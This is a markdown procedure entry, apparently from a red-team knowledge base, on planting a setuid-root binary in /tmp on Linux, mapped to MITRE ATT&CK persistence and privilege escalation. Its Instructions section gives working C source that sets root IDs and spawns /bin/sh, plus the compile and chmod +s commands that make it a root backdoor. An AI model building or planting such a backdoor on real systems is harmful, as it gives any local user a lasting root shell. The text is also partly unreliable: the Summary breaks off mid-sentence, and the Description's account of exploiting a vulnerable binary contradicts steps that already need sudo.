---
id: a598693d-5089-44bc-b715-3c00a683704e
name: Linux - SUID Privilege Escalation via SetUID Binary Creation
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:18.842132+00:00'
updated_at: '2023-04-10T20:34:34.394259+00:00'
tactics:
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Setuid and Setgid|T1166 - Setuid and Setgid]]'
tags:
- '[[Create a SUID binary]]'
- '[[Linux - Privilege Escalation]]'
- '[[SUID]]'
---

# Linux - SUID Privilege Escalation via SetUID Binary Creation

## Summary

This procedure involves creating a SUID binary to escalate privileges on a Linux system. SUID binaries are executable files that run with the permissions of the file owner, rather than the permissions of the user who is executing the file. By creating a SUID binary, an attacker can execute commands

## Description

# Description

This procedure involves creating a SUID binary to escalate privileges on a Linux system. SUID binaries are executable files that run with the permissions of the file owner, rather than the permissions of the user who is executing the file. By creating a SUID binary, an attacker can execute commands with elevated privileges, potentially allowing them to access sensitive data or execute other malicious activities. To create a SUID binary, an attacker must first identify a vulnerable binary that can be exploited, then modify the binary's permissions using the 'chmod' command. This procedure can be used in combination with other privilege escalation techniques to gain access to sensitive data or execute other malicious activities.

 

## Requirements

1. Access to a vulnerable binary that can be exploited

1. Ability to modify binary permissions using the 'chmod' command

 

## Defense

1. Regularly review file permissions and remove unnecessary SUID binaries

1. Implement strict file system permissions to limit access to sensitive files

1. Use intrusion detection systems to monitor for suspicious activity

 

## Objectives

1. Escalate privileges on a Linux system

1. Access sensitive data or execute other malicious activities

 

# Instructions

1. To create a setuid binary, follow these steps:

 



**Code**: [[print 'int main(void){\nsetresuid(0, 0, 0);\nsyste]]



> 1. Create a new file named suid.c in the /tmp directory and write the following code in it:

int main(void){
setresuid(0, 0, 0);
system("/bin/sh");
}

2. Compile the code using the gcc compiler and create a new binary file named suid in the /tmp directory:

gcc -o /tmp/suid /tmp/suid.c

3. Give execute permission to the binary file:

sudo chmod +x /tmp/suid

4. Set the setuid bit on the binary file:

sudo chmod +s /tmp/suid

After following these steps, you will have a new setuid binary file named suid in the /tmp directory. This binary file will allow any user who executes it to run commands with the privileges of the owner of the file.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Setuid and Setgid|T1166 - Setuid and Setgid]]

## Tags

- [[Create a SUID binary]]
- [[Linux - Privilege Escalation]]
- [[SUID]]


